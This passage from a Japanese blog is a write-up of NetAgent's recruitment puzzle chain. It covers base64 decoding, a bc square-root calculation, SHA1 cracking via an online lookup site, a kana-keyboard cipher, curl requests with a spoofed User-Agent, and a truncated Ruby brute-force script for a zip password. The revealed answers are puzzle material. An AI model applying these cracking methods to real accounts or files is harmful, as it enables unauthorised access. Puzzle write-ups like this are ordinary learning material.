</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70362410
</span><span class='line'>Compressed: 70373511
</span><span class='line'>
</span><span class='line'>Kernel  <span class="nv">Time</span> <span class="o">=</span>     0.046 <span class="o">=</span>    1%
</span><span class='line'>User    <span class="nv">Time</span> <span class="o">=</span>     0.780 <span class="o">=</span>   17%
</span><span class='line'>Process <span class="nv">Time</span> <span class="o">=</span>     0.826 <span class="o">=</span>   18%    Virtual  <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">2</span> MB
</span><span class='line'>Global  <span class="nv">Time</span> <span class="o">=</span>     4.394 <span class="o">=</span>  100%    Physical <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">4</span> MB
</span></code></pre></td></tr></table></div></figure>




<!--
$ wine 7z.exe x mondai6.zip -pЧебурашка

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai6.zip

Extracting  hint6.txt
Extracting  mondai6.txt
Extracting  mondai7.zip

Everything is Ok

Files: 3
Size:       70362410
Compressed: 70373511

Kernel  Time =     0.046 =    5%
User    Time =     0.811 =   89%
Process Time =     0.858 =   94%    Virtual  Memory =      2 MB
Global  Time =     0.909 =  100%    Physical Memory =      4 MB
-->


<p>解凍できました！（やっと終わった。。）</p>

<h1>mondai6</h1>

<p>mondai6.txtには以下のように記載がありました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span></code></pre></td></tr></table></div></figure>


<p>実際にこのURLにアクセスしに行くと、次のようなレスポンスを得られました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>curl -v http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 49.212.84.208...
</span><span class='line'>* Connected to 49.212.84.208 <span class="o">(</span>49.212.84.208<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.37.1
</span><span class='line'>&gt; Host: 49.212.84.208
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Date: Tue, <span class="m">07</span> Apr <span class="m">2015</span> 08:20:21 GMT
</span><span class='line'>* Server Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span> is not blacklisted
</span><span class='line'>&lt; Server: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span><span class='line'>&lt;
</span><span class='line'><span class="o">{</span> <span class="o">[</span>data not shown<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;HTML&gt;&lt;BODY&gt;use R4000
</span><span class='line'>&lt;/BODY&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>なにやらR4000を使えとの文字だけが返ってきました。
R4000でGoogle検索すると、MIPSのプロセッサ情報がいくつか引っかかります。
MIPS R4000を搭載したデバイスでアクセスすればいいのかな？と思ったので、
Googleで「MIPS R4000 デバイス」で検索し、MIPS R4000搭載のデバイスを探してみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/14/mips-r4000-search.png" alt="mips-r4000-search.png" /></p>

<p>検索結果1ページ目によると、PSPに搭載されているとの情報がいくつかヒットしていました。
早速PSPのブラウザからアクセスする際に送られるUser-Agentを調べてみます。</p>

<p><a href="http://www.openspc2.org/userAgent/">userAgent一覧/ユーザーエージェント一覧</a></p>

<p>このサイトによると、PSPのUAは、</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>Mozilla/4.0 <span class="o">(</span>PSP PlayStation Portable<span class="o">)</span><span class="p">;</span> 2.00<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>となっているようです。</p>

<p>早速このUAで先ほどのURLにアクセスしてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>curl -v -A <span class="s1">&#39;Mozilla/4.0 (PSP PlayStation Portable); 2.00)&#39;</span> http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 49.212.84.208...
</span><span class='line'>* Connected to 49.212.84.208 <span class="o">(</span>49.212.84.208<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
</span><span class='line'>&gt; User-Agent: Mozilla/4.0 <span class="o">(</span>PSP PlayStation Portable<span class="o">)</span><span class="p">;</span> 2.00<span class="o">)</span>
</span><span class='line'>&gt; Host: 49.212.84.208
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Date: Tue, <span class="m">07</span> Apr <span class="m">2015</span> 08:31:47 GMT
</span><span class='line'>* Server Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span> is not blacklisted
</span><span class='line'>&lt; Server: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>
</span><span class='line'>&lt; Content-Length: 42
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span><span class='line'>&lt;
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;HTML&gt;&lt;BODY&gt;de la Bucure?ti
</span><span class='line'>&lt;/BODY&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>レスポンスが変わりました。知らない国の言葉で書かれていたのでGoogle翻訳にタイプしてみると、ルーマニア語であるとの情報を得ました。</p>

<p>先ほどのレスポンスの一部文字が&#8221;?&#8221;となっているので、ルーマニア語を許容するヘッダーを付加すると表示が変わるかもしれないと思い、Accept-Languageにルーマニア語を指定してアクセスしてみました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>curl -v -H <span class="s1">&#39;Accept-Language: ro-RO&#39;</span> -A <span class="s1">&#39;Mozilla/4.0 (PSP PlayStation Portable); 2.00)&#39;</span> http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 49.212.84.208...
</span><span class='line'>* Connected to 49.212.84.208 <span class="o">(</span>49.212.84.208<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
</span><span class='line'>&gt; User-Agent: Mozilla/4.0 <span class="o">(</span>PSP PlayStation Portable<span class="o">)</span><span class="p">;</span> 2.00<span class="o">)</span>
</span><span class='line'>&gt; Host: 49.212.84.208
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Accept-Language: ro-RO
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Date: Tue, <span class="m">07</span> Apr <span class="m">2015</span> 08:35:33 GMT
</span><span class='line'>* Server Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span> is not blacklisted
</span><span class='line'>&lt; Server: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span><span class='line'>&lt;
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;HTML&gt;&lt;BODY&gt;key: Minesweeper1990
</span><span class='line'>&lt;/BODY&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>表示が変わり、mondai6の答えが出てきました。mondai7.zipのパスワードに指定して解凍してmondai6はおしまいです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai7.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai7.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint7.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai8.zip
</span><span class='line'>Extracting  normal.exe
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70383731
</span><span class='line'>Compressed: 70362268
</span></code></pre></td></tr></table></div></figure>




<!--
$ 7z x mondai7.zip -pMinesweeper1990

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai7.zip

Extracting  hint7.txt
Extracting  mondai8.zip
Extracting  normal.exe

Everything is Ok

Files: 3
Size:       70383731
Compressed: 70362268
-->


<p>明日はmondai7からmondai9までのWrite-upを公開する予定です。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その1]]></title>
    <link href="http://mzyy94.com/blog/2015/04/13/netagent-mondai1-4/"/>
    <updated>2015-04-13T14:08:49+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/13/netagent-mondai1-4</id>
    <content type="html"><![CDATA[<p>恒例のネットエージェントのいきなり最終面接問題が3月末に公開されました。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>ネットニュースサイトにも取り上げられ（<a href="http://nlab.itmedia.co.jp/nl/articles/1503/30/news143.html">「解けたらいきなり最終面接」 ネットエージェント、今年も新卒向けに“難問”出題 - ねとらぼ</a>）、盛り上がりを見せていたあのmondaiです。
2016年新卒として、書類審査や2次選考を飛ばして最終面接を受けられるということなので本腰を入れて取り組んでみました。
このいきなり最終面接問題に関しては、全問正解しなければ回答の公開をしてはいけないとのことだったので察しがつくと思いますが、なんとかすべての問題をクリアできました。
これらmondaiを解いてきた過程をWrite-upとして残すことにしたので、興味がある方はご覧ください。</p>

<p>この記事ではmondai1からmondai4までの回答を掲載しています。</p>

<!-- more -->


<h1>mondai1</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>選考過程を縮めたい方に問題を用意いたしました。問題に答えると最終面接から始められます。 
</span><span class='line'>※２０１６年３月卒業予定の方以外も挑戦していただけますが、採用対象とはなりません。
</span><span class='line'>問題：LzYxMDIvcGouaGJwLy86cHR0aA==
</span></code></pre></td></tr></table></div></figure>


<p>BASE64でエンコードされた文字列を渡されるので、ちょちょっとコマンドを打つと逆さまになったURLがでてきます。</p>

<p>なので<code>rev</code>コマンドを噛ませて逆順にしてアクセス可能なURLが表示されたらmondai1はおしまいです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">echo </span><span class="nv">LzYxMDIvcGouaGJwLy86cHR0aA</span><span class="o">==</span> <span class="p">|</span> base64 -D <span class="p">|</span> rev
</span></code></pre></td></tr></table></div></figure>


<!--
http://pbh.jp/2016/
-->


<h1>modai2</h1>

<p>mondai1の答えのURLにアクセスするとzip圧縮されたファイルを入手でき、そのファイルを展開するとmondai2.txtとzip形式の圧縮ファイルがあります。mondai2.txtの内容は以下の通りでした。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>2016の平方根の小数点以下2016桁目から20桁をパスワードにしました。
</span></code></pre></td></tr></table></div></figure>


<p>大きな有効数字の平方根を扱えるコマンドが*nix系システムには存在します。そう<code>bc</code>コマンドです。</p>

<p>この<code>bc</code>コマンドを用いて小数点以下2035桁(2015番目から20桁)の2016の平方根を計算させます。
<code>bc</code>コマンドによる出力は、適当な桁数で折り返しがあるので<code>perl</code>の正規表現を用いて削り、<code>tail</code>で終端から20バイトを取り出します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;scale=2015+20;sqrt(2016)&#39;</span> <span class="p">|</span> bc <span class="p">|</span> perl -pe<span class="s1">&#39;s/\\?\n//&#39;</span> <span class="p">|</span> tail -c20
</span></code></pre></td></tr></table></div></figure>




<!--
74571026133060730881
-->


<p>これをパスワードとして入力すればmondai3.zipを解凍できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai3.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai3.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint3.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai3.txt
</span><span class='line'>Extracting  mondai4.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70392202
</span><span class='line'>Compressed: 70392736
</span></code></pre></td></tr></table></div></figure>




<!--

$ 7za x mondai3.zip -p74571026133060730881

7-Zip (a) [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai3.zip

Extracting  hint3.txt
Extracting  mondai3.txt
Extracting  mondai4.zip

Everything is Ok

Files: 3
Size:       70392202
Compressed: 70392736

-->


<h1>mondai3</h1>

<p>mondai3.txtの中身は以下の通り。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ハッシュパスワード問題
</span><span class='line'>答え：３つの答えをつなげて
</span><span class='line'>
</span><span class='line'>0f1aae8b8398c20f81e1c36e349a7880c9234c63
</span><span class='line'>01821f5469967540a5a774197463e8c4d658f588
</span><span class='line'>264f39cab871e4cfd65b3a002f7255888bb5ed97
</span></code></pre></td></tr></table></div></figure>


<p>パスワードを3つに分割してSHA1ハッシュを生成したものが記されており、それらの元の文字列を探し出せばいいというもの。広いWebの世界には単純な単語のハッシュ化前後のテーブルが存在し、手軽に利用できるものに
<a href="http://www.hashkiller.co.uk/sha1-decrypter.aspx">SHA1 Decrypter - SHA1 Decryption, Free SHA1 Decryptor, Online SHA1 Cracker, SHA1 Security</a>などがあります。このサイトに問題のハッシュ値をペーストして探索をかけると1秒足らずでハッシュ化前の数値を返してくれます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/hashkiller.png" alt="hashkiller.png" /></p>

<p>ここで得られた単語をそのままくっつけてパスワードに指定すると、mondai4.zipが解凍できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai4.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai4.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint4.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai4.png
</span><span class='line'>Extracting  mondai5.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70391846
</span><span class='line'>Compressed: 70391891
</span></code></pre></td></tr></table></div></figure>




<!--
$ 7za x mondai4.zip -ptokyouenoline

7-Zip (a) [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai4.zip

Extracting  hint4.txt
Extracting  mondai4.png
Extracting  mondai5.zip

Everything is Ok

Files: 3
Size:       70391846
Compressed: 70391891

-->


<h1>mondai4</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/mondai4.png" alt="mondai4.png" />
mondai4.pngはヒエログリフが書かれた画像です。ヒエログリフを読解できなければ問題文すら読めない状況なので、ヒエログリフ学習サイトを探して学びます。以下のサイトを参考に3分ほどで学びました。</p>

<ul>
<li><a href="http://www004.upp.so-net.ne.jp/anubis/j50/jp50.html">日本語五十音をヒエログリフで表現</a></li>
</ul>


<p>ヒエログリフを学び終わると、すらすらと画像の文字が読めるようになるので、日本語に起こします。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>のらかちいくち　てちのちんちもちみら　もにみちもにみら　もにとちのにみちもちい　のらもらま
</span></code></pre></td></tr></table></div></figure>


<p>ぱっと見で平仮名で換字式暗号化された英文もしくはローマ字の文だと想像がつきます。ここで適当な文節として二言目の「てちのちんちもちみら」をGoogleで検索してみると、上位にヒットしたものにこの暗号の手がかりがでてきます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/techinochi-search.png" alt="techinochi-search.png" /></p>

<p>日本語キーボードのかな入力モードにしてローマ字の文を打った文は、母音に位置する「ら」や「ち」が多く登場することから、この暗号方式はカナ入力のままのローマ字打ちだと断定しました。
しかし英字キーボードユーザーなので、かなが印刷されたキーボードを持っていません。仕方なしにWikimediaでそれっぽい画像を拾ってきて、平仮名⇆アルファベット変換を行うと、上記の平仮名文字列は以下のように変換できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>kotaeha wakayamano minamino misakinamae komoji
</span></code></pre></td></tr></table></div></figure>


<p>「答えは和歌山の南の岬名前小文字」とのことです。早速Googleマップを開いて和歌山県の南にある岬を探します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/wakayama-map.png" alt="wakayama-map.png" /></p>

<p>探すと潮岬（読み：しおのみさき）が和歌山の南部にある岬なので、これをアルファベット小文字にしてパスワードにして回答終了…だとおもってました。
<strong>shionomisaki</strong>としてタイプしてもパスワードが間違っていると言われ、解凍できません。「もしや違う岬なのかな？」と思い、和歌山の岬をいろいろ調べて同じように入力しても開きません。もうだめ&#8230;と心折れそうになってしまったので、あとはBruteForceに任せようと、次のような適当なスクリプトを書いて放置しました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># kana 50 components</span>
</span><span class='line'><span class="n">vowel5</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;o&#39;</span><span class="o">]</span>
</span><span class='line'><span class="n">consonant5</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;k&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;ch&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">,</span> <span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">,</span> <span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="o">]</span>
</span><span class='line'><span class="n">vowel3</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;o&#39;</span><span class="o">]</span>
